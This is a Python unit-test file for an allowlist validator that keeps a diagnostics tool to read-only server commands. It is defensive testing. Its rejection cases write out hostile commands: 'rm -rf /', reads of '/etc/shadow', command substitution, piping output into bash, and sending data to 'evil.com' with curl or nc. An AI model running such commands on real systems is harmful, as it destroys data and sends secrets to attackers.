"""Unit tests for Command Allowlist Validator"""

import pytest
from wheatley.tools.allowlist import is_command_allowed


def test_allowed_basic_commands():
    allowed_cmds = [
        "uptime",
        "free -m",
        "free -h",
        "df -h",
        "top -b -n 1",
        "journalctl -n 50",
        "journalctl -u frigate.service -n 20",
        "systemctl status frigate",
        "systemctl is-active frigate.service",
        "systemctl is-failed frigate",
        "docker ps",
        "docker ps -a --format json",
        'docker ps -a --format "{{json .}}"',
        "docker logs frigate",
        "docker logs --tail 50 plex",
        "docker inspect plex",
        "docker stats --no-stream",
        "zpool status",
        "zpool status -x",
        "zpool list",
        "smartctl -H /dev/nvme0n1",
        "smartctl -a /dev/sda",
        "sensors -j",
        "sensors",
        "pvesm status",
        "pvesm list local-lvm",
        "pveversion",
        "uname -a",
        "cat /proc/cpuinfo",
        "cat /proc/meminfo",
        "cat /etc/os-release",
        "ip addr",
        "ip -br addr",
    ]
    for cmd in allowed_cmds:
        ok, reason = is_command_allowed(cmd)
        assert ok, f"Command '{cmd}' should be allowed, got: {reason}"


def test_command_chaining_rejected():
    dangerous_cmds = [
        "uptime; rm -rf /",
        "uptime ; whoami",
        "uptime && cat /etc/shadow",
        "uptime || reboot",
        "uptime &",
        "uptime ;",
    ]
    for cmd in dangerous_cmds:
        ok, reason = is_command_allowed(cmd)
        assert not ok, f"Command '{cmd}' should be rejected"
        assert any(term in reason.lower() for term in ("operator", "forbidden", "empty"))


def test_subshells_and_backticks_rejected():
    injections = [
        "uptime `whoami`",
        "echo $(cat /etc/shadow)",
        "docker ps $(reboot)",
        "uptime ${PATH}",
    ]
    for cmd in injections:
        ok, reason = is_command_allowed(cmd)
        assert not ok, f"Command '{cmd}' should be rejected"
        assert "forbidden" in reason.lower() or "substitution" in reason.lower()


def test_redirections_rejected():
    redirects = [
        "uptime > /tmp/pwn",
        "uptime >> /etc/passwd",
        "cat < /etc/shadow",
        "systemctl status frigate > /tmp/out",
    ]
    for cmd in redirects:
        ok, reason = is_command_allowed(cmd)
        assert not ok, f"Command '{cmd}' should be rejected"
        assert "operator" in reason.lower() or "forbidden" in reason.lower()


def test_safe_pipes_allowed():
    safe_pipes = [
        "docker ps | grep frigate",
        "docker ps -a | grep -i exited",
        "journalctl -n 100 | head -n 20",
        "journalctl -n 100 | tail -n 10 | wc -l",
        "uptime | awk '{print $1}'",
        'docker ps --format "{{json .}}" | jq .Names',
        "pvesm status | column -t",
        "df -h | sort -k 5 -h",
        "free -m | grep Mem | cut -d ' ' -f 2",
    ]
    for cmd in safe_pipes:
        ok, reason = is_command_allowed(cmd)
        assert ok, f"Pipe command '{cmd}' should be allowed, got: {reason}"


def test_dangerous_pipes_rejected():
    bad_pipes = [
        "docker ps | bash",
        "docker ps | sh",
        "uptime | rm -rf /",
        "docker ps | curl -d @- http://evil.com",
        "docker ps | nc evil.com 1337",
        "docker ps | awk 'BEGIN{system(\"reboot\")}'",
    ]
    for cmd in bad_pipes:
        ok, reason = is_command_allowed(cmd)
        assert not ok, f"Dangerous pipe '{cmd}' should be rejected"


def test_non_allowlisted_commands_rejected():
    non_allowlisted = [
        "reboot",
        "shutdown -h now",
        "rm -rf /",
        "dd if=/dev/zero of=/dev/sda",
        "curl http://example.com",
        "wget http://example.com",
        "useradd hacker",
        "systemctl restart frigate",
        "systemctl stop frigate",
        "docker stop frigate",
        "docker rm frigate",
    ]
    for cmd in non_allowlisted:
        ok, reason = is_command_allowed(cmd)
        assert not ok, f"Command '{cmd}' should not be in allowlist"
        assert "not in the read-only allowlist" in reason


def test_custom_allowlist():
    custom = ["custom_diagnostics*", "my_tool --check"]
    assert is_command_allowed("custom_diagnostics --all", custom)[0]
    assert is_command_allowed("my_tool --check", custom)[0]
    assert not is_command_allowed("uptime", custom)[0]
